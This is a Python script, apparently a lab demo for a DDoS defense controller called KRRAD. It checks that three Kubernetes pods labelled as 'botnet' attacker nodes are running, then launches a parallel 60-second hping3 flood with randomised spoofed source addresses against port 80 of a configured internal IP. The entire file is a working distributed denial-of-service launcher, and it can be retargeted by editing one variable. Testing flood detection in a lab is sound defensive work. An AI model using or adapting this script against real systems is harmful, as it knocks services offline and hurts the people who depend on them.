import time
import subprocess
import threading
import sys
import os

# Configuration
ATTACKER_PODS = ["attacker-1", "attacker-2", "attacker-3"]
TARGET_IP = "10.128.0.2"  # Your VM Internal IP
DURATION = 60  # Attack duration in seconds

def run_command(cmd):
    """Runs a shell command and returns output."""
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8').strip()
    except subprocess.CalledProcessError as e:
        return None

def check_pod_status(pod_name):
    """Checks if a pod is Running."""
    status = run_command(f"kubectl get pod {pod_name} -o jsonpath='{{.status.phase}}'")
    return status == "Running"

def launch_attack(pod_name):
    """Executes the flooding command inside an attacker pod."""
    print(f"   ⚔️  {pod_name} engaging target {TARGET_IP}...")
    # Using 'timeout' to auto-stop the attack after DURATION seconds
    cmd = f"kubectl exec {pod_name} -- timeout {DURATION}s hping3 --flood --rand-source -p 80 {TARGET_IP}"
    
    # We use Popen to run it in the background without waiting
    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    print("\n🚀 KRRAD Demo: TRUE Distributed Attack (3 Botnet Nodes)")
    print("--------------------------------------------------")
    
    # 1. Verify Attackers are Ready
    print("🔍 Verifying Botnet Fleet...")
    ready_count = 0
    for pod in ATTACKER_PODS:
        if check_pod_status(pod):
            print(f"   ✅ {pod} is READY.")
            ready_count += 1
        else:
            print(f"   ❌ {pod} is NOT READY (Check 'kubectl get pods').")
    
    if ready_count < 3:
        print("\n⚠️  Error: Not all attacker bots are ready. Please wait a moment or run 'kubectl get pods'.")
        sys.exit(1)

    print(f"\n🎯 Target Locked: {TARGET_IP}")
    print(f"⏱️  Attack Duration: {DURATION} seconds")
    print("⚠️  LAUNCHING SWARM... (Monitor the Controller logs!)")
    print("--------------------------------------------------")

    # 2. Launch Attacks in Parallel
    threads = []
    for pod in ATTACKER_PODS:
        t = threading.Thread(target=launch_attack, args=(pod,))
        t.start()
        threads.append(t)
        time.sleep(0.5) # Stagger slightly to prevent API throttling

    # 3. Wait for finish
    print("\n🔥 Attack is LIVE. Watch the Controller Terminal!")
    print("   (The script will exit automatically when the attack timeout finishes)")
    
    for t in threads:
        t.join()

    print("\n✅ Attack sequence finished.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Attack Aborted by User.")
